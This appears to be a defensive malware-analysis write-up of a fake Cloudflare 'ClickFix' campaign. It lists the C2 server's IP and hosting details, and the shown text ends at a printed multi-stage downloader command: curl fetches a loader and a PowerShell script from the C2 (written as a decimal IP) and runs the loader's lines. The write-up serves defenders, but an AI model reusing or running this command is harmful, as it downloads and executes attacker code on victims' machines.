# Fake Cloudflare ClickFix: When "Verify You Are Human" Tells You to Open CMD

> **Analyst Note:** This is a static and behavioral reverse-engineering analysis of a live ClickFix malware campaign encountered in the wild. All payloads were analyzed safely without execution.

---

## Table of Contents
- [Chapter 1: Infrastructure & Reconnaissance](#chapter-1-infrastructure--reconnaissance)
- [Chapter 2: Payload Architecture & File Analysis](#chapter-2-payload-architecture--file-analysis)
- [Chapter 3: Correlation & Threat Intelligence](#chapter-3-correlation--threat-intelligence)
- [Chapter 4: Sandbox Behaviour & MITRE ATT&CK Mapping](#chapter-4-sandbox-behaviour--mitre-attack-mapping)
- [Mitigation & Defense](#mitigation--defense)

---

## Chapter 1: Infrastructure & Reconnaissance

### Overview
The attack vector utilizes a fake Cloudflare verification page leveraging the **ClickFix** social engineering technique. Instead of a standard file download, victims are tricked into opening the Windows `CMD` or `Run` dialog and pasting a heavily obfuscated command.

- **Initial Redirection:** User attempted to download a file and was auto-redirected to a fake verification template.
- **C2 Server IP:** `185.138.88.151`
- **Location:** Amsterdam, Netherlands
- **Hosting Provider / ASN:** `ASN 215540` — `GCS-AS GLOBAL CONNECTIVITY SOLUTIONS LLP`
- **Infrastructure Pattern:** The attacker uses budget European VPS providers known for lenient abuse policies to host transient loader scripts (`/438`) and payloads (`/439`).

---

## Chapter 2: Payload Architecture & File Analysis

When the payload clipboard is executed, it invokes a multi-stage downloader pattern:

```cmd
set "__VSCMD_WIN_64BIT=true" && cd %tmp% & curl.exe -sLo %tmp%\trungle.txt 3112851607/438 && curl.exe -sLo %tmp%\Z595.ps1 3112851607/439 && for /f "delims=" %i in (trungle.txt) do %i
